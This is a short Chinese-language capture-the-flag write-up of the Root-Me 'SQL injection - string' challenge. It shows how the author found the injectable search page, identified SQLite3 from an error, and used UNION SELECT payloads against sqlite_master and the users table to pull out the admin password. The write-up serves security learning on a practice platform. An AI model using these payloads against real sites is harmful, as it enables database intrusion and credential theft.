## [[Root-Me](https://www.root-me.org/)] [[Web-Server](https://www.root-me.org/en/Challenges/Web-Server/)] [[SQL injection - string](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-string)] [[解题报告](https://exp-blog.com/safe/ctf/rootme/web-server/sql-injection-string/)]

------


SQLi 水题。关键是找到注入点。

查看页面源码，发现这题其实是有 3 个页面的：

- [`?action=news`](http://challenge01.root-me.org/web-serveur/ch19/?action=news)
- [`?action=login`](http://challenge01.root-me.org/web-serveur/ch19/?action=login)
- [`?action=recherche`](http://challenge01.root-me.org/web-serveur/ch19/?action=recherche)

虽然三个页面都有数据库查询操作，但是测试发现注入点在 [`?action=recherche`](http://challenge01.root-me.org/web-serveur/ch19/?action=recherche) 页面。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B33%5D%20%5B30P%5D%20SQL%20injection%20-%20string/imgs/01.png)

------------

首先确认数据库类型，输入 payload ：`'exp error'` 故意不闭合引号，尝试令 SQL 报错。

通过页面回显的异常信息，可以确认是 SQLite3 数据库。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B33%5D%20%5B30P%5D%20SQL%20injection%20-%20string/imgs/02.png)

在 SQLite3 中只有一个系统隐藏表 sqlite_master ，其表结构如下：

```sql
CREATE TABLE sqlite_master (
    type TEXT,
    name TEXT,
    tbl_name TEXT,
    rootpage INTEGER,
    sql TEXT
);
```

这张表存储了数据库中每个数据表的信息，可以通过它找到其他数据表。

构造跨表查询 payload ：`exp' or 1=1 union select name, sql from sqlite_master --`

从中找到账户表及其表结构 `users (CREATE TABLE users(username TEXT, password TEXT, Year INTEGER))`

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B33%5D%20%5B30P%5D%20SQL%20injection%20-%20string/imgs/03.png)

进一步构造 payload 跨表查询 users 的账号信息：

`exp' or 1=1 union select username, password from users --`

得到 admin 的密码，完成挑战。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B33%5D%20%5B30P%5D%20SQL%20injection%20-%20string/imgs/04.png)

------

## 版权声明

　[![Copyright (C) EXP,2016](https://img.shields.io/badge/Copyright%20(C)-EXP%202016-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
